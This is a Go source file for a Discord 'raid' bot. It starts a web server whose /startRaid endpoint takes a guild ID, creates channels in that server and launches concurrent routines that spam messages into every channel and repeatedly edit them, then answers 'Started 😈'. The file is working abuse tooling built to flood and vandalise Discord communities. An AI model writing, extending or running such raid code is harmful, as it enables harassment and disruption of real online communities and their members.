package main

import (
	"fmt"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/gofiber/fiber/v2"
)

type (
	GlobalErrorHandlerResp struct {
		Success bool   `json:"success"`
		Message string `json:"message"`
	}
)

func StartWebServer(discordSession *discordgo.Session) {
	app := fiber.New(fiber.Config{
		AppName: "Raid-Go Web Server",
		ErrorHandler: func(c *fiber.Ctx, err error) error {
			return c.Status(fiber.StatusBadRequest).JSON(GlobalErrorHandlerResp{
				Success: false,
				Message: err.Error(),
			})
		},
		DisableStartupMessage: true,
	})

	app.Get("/", func(c *fiber.Ctx) error {
		//discordSession.ChannelMessageSend("1199372230669381643", "this comes from http req")
		return c.SendString("Hello, World!")
	})

	app.Get("/startRaid", func(c *fiber.Ctx) error {
		guildId := c.Query("guildId")

		if guildId == "" {
			return c.Status(400).SendString("no guildId query provided")
		}

		guilds, err := discordSession.GuildChannels(guildId)

		if err != nil {
			println("Failed to get channels for gid" + guildId)
		}

		if config.Bot.Raid.Channels.WaitForCreation {
			createChannels(guildId, false, discordSession)
			time.Sleep(2)
		} else {
			go createChannels(guildId, true, discordSession)
		}

		for _, channel := range guilds {
			go spamMessages(channel.ID, discordSession)

			if config.Bot.Raid.Channels.Edit.Enable == true {
				go spamChannelEdit(channel.ID, discordSession)
			}
		}
		return c.SendString("Started 😈")

	})

	if err := app.Listen(fmt.Sprintf("%s:%d", config.WebServer.Host, config.WebServer.Port)); err != nil {
		fmt.Printf("Web server failed to start: %v", err)
	}

}
